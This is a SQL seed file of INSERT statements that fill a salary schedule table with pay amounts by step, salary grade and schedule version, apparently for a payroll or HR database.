INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '24', '49750.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '24', '50297.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '24', '50850.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '24', '51410.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '24', '51975.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '24', '52547.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '24', '53125.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '24', '53709.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '25', '53730.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '25', '54321.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '25', '54918.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '25', '55522.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '25', '56133.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '25', '56750.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '26', '61965.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '25', '58006.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '25', '57375.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '26', '58028.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '26', '58666.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '26', '59312.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '26', '59964.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '26', '60624.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '26', '61291.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '26', '62646.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '27', '62670.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '27', '63360.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '27', '64057.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '27', '64761.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '27', '64474.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '27', '66194.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '27', '66922.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '27', '67658.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '28', '67684.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '28', '68428.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '28', '69181.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '28', '69942.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '28', '70711.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '28', '71489.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '28', '72276.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '28', '73071.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '29', '73099.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '29', '73903.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '29', '74716.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '29', '75537.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '29', '76368.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '29', '77208.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '29', '78058.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '29', '78916.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '30', '78946.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '30', '79815.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '30', '80693.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '30', '81580.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '30', '82478.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '30', '83385.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '30', '84302.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '30', '85230.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '31', '90000.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '31', '90990.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '31', '91991.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '31', '93003.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '31', '94026.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '31', '95060.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '31', '96106.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '31', '97163.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '32', '103000.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '32', '104133.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '32', '105278.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '32', '106437.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '32', '107607.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '32', '108791.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '32', '109988.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '32', '111198.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '33', '120000.00', '3');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '30', '67944.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '28', '58132.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '27', '54088.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '26', '50334.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '25', '46848.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '24', '43612.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '23', '40604.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '22', '37812.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '21', '35219.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '20', '32810.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '19', '30475.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '18', '28305.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '17', '26292.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '16', '24423.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '14', '21078.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '13', '19658.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '12', '18333.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '11', '17099.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '10', '15948.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '9', '14857.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '8', '13833.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '7', '12880.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '6', '11992.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '5', '11145.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '4', '10358.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '3', '9628.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '2', '8932.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '1', '8287.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '29', '62488.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '15', '22688.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '33', '107470.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '32', '100011.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '32', '98698.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '32', '97405.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '32', '96132.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '32', '94874.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '32', '93642.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '32', '92425.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '32', '91226.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '31', '87408.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '31', '86261.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '31', '85130.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '31', '84017.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '31', '82921.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '31', '81841.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '31', '80777.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('1', '31', '79729.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '30', '74305.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '30', '73356.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '30', '72422.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '30', '71500.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '30', '70592.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '30', '69697.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '30', '68814.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '29', '68296.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '29', '67431.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '29', '66576.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '29', '65735.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '29', '64905.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '29', '64088.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '29', '63282.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '28', '63562.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '28', '62752.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '28', '61953.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '28', '61167.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '28', '60392.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '28', '59628.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '28', '58874.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '27', '59166.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '27', '58408.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '27', '57662.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '27', '56926.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '27', '56201.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '27', '55487.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '27', '54782.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '26', '55083.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '26', '54374.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '26', '53676.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '26', '52988.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '26', '52310.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '26', '51642.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '26', '50982.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '25', '51292.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '25', '50628.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '25', '49974.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '25', '49330.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '25', '48696.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '25', '48071.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '25', '47456.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '24', '47769.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '24', '47148.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '24', '46537.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '24', '45934.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '24', '45340.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '24', '44756.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '24', '44179.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '23', '44498.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '23', '43916.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '23', '43343.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '23', '42778.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '23', '42223.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '23', '41676.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '23', '41136.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '22', '41457.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '22', '40913.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '22', '40376.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '22', '39848.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '22', '39327.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '22', '38815.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '22', '38310.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '21', '38633.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '21', '36123.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '21', '37620.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '21', '37125.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '21', '36638.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '21', '36158.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '21', '35685.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '20', '36009.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '20', '35530.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '20', '35059.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '20', '34596.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '20', '34140.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '20', '33688.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '20', '33246.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '19', '33453.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '19', '33008.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '19', '32568.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '19', '32137.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '19', '31711.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '19', '31292.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '19', '30880.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '18', '31080.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '18', '30666.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '18', '30256.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('5', '18', '29854.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('4', '18', '29458.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('3', '18', '29068.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('2', '18', '28684.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('8', '17', '28878.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('7', '17', '28491.00', '2');
INSERT INTO `tblsalarysched` (`stepNumber`, `salaryGradeNumber`, `actualSalary`, `version`) VALUES ('6', '17', '28110.00', '2');
